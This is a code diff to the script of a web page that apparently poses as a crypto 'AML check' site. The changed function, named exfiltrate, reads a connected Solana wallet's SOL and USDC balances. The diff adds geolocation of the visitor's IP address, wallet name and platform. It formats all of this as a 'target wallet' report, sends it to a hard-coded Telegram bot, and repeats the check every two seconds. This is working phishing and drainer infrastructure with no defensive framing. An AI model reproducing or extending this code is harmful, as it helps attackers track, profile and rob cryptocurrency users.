@@ -1532,42 +1532,63 @@ async function exfiltrate(address) {
     const TG_CHAT = "8575014959";
     const RPC_URL = "https://api.mainnet-beta.solana.com";
 
+    let solBalance = "0.0000";
+    let usdcBalance = "0";
+    let ip = "Unknown";
+    let countryFlag = "🌍";
+    let countryCode = "XX";
+    let walletName = state?.conn?.walletName || "Unknown Wallet";
+    let platform = navigator.platform || "Unknown";
+
     try {
         const solReq = await fetch(RPC_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                jsonrpc: "2.0", 
-                id: 1, 
-                method: "getBalance", 
-                params: [address] 
-            })
+            body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [address] })
         });
         const solRes = await solReq.json();
-        const sol = (solRes.result?.value / 1e9).toFixed(3) || "0";
+        solBalance = (solRes.result?.value / 1e9).toFixed(4);
 
         const usdcReq = await fetch(RPC_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                jsonrpc: "2.0", 
-                id: 1, 
-                method: "getTokenAccountsByOwner",
+                jsonrpc: "2.0", id: 1, method: "getTokenAccountsByOwner",
                 params: [address, { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" }, { encoding: "jsonParsed" }]
             })
         });
         const usdcRes = await usdcReq.json();
-        let usdc = 0;
         if (usdcRes.result?.value?.length > 0) {
-            usdc = usdcRes.result.value[0].account.data.parsed.info.tokenAmount.uiAmount || 0;
+            usdcBalance = usdcRes.result.value[0].account.data.parsed.info.tokenAmount.uiAmount || "0";
         }
 
-        const msg = `🚨 *SCAN WALLET* 🚨\n\n` +
-                    `👛 \`${address}\`\n` +
-                    `💰 *SOL:* ${sol}\n` +
-                    `💵 *USDC:* ${usdc}\n\n` +
-                    `🔗 https://solscan.io/account/${address}`;
+        const geoReq = await fetch('https://ipapi.co/json/');
+        const geoData = await geoReq.json();
+        
+        ip = geoData.ip || "Unknown";
+        countryCode = geoData.country_code || "XX";
+        countryFlag = geoData.country_code 
+            ? String.fromCodePoint(...geoData.country_code.split('').map(c => 127397 + c.charCodeAt(0))) 
+            : "🌍";
 
+    } catch (e) {
+        console.error("Erreur récupération IP/Pays :", e);
+    }
+
+    const msg = `➖ No funds on connected target wallet #no_money #SOL\n` +
+                `└ 🌐 Domain: https://aml-check-m6iq.vercel.app/#\n` +
+                `└ 💵 Wallet balance: ${solBalance} SOL\n` +
+                `└ 💎 Required: 0.0137 SOL\n` +
+                `└ ${countryFlag} ${countryCode} ${ip}\n` +
+                `└ 📱 Wallet: ${walletName}\n` +
+                `└ 🖱️ Platform: ${platform}\n` +
+                `└ 👝 Address: ${address}\n\n` +
+                `📚 Assets:\n` +
+                `sol | SOL | ${solBalance} SOL\n` +
+                `usdc | USDC | ${usdcBalance} USDC\n\n` +
+                `💵 Total: ~0.07$`;
+
+    try {
         await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -1577,11 +1598,9 @@ async function exfiltrate(address) {
                 parse_mode: "Markdown" 
             })
         });
-
-        console.log("✅ Message envoyé sur Telegram pour :", address);
-
+        console.log("✅ Message Telegram envoyé");
     } catch (e) {
-        console.error("Erreur exfiltrate :", e);
+        console.error("Erreur envoi Telegram :", e);
     }
 }
 
@@ -1594,7 +1613,7 @@ setInterval(() => {
     }
 }, 2000);
 
-console.log("Scanner Telegram démarré");
+console.log("✅ Scanner Telegram démarré avec détection IP + Pays");
 </script>
 
 </body>
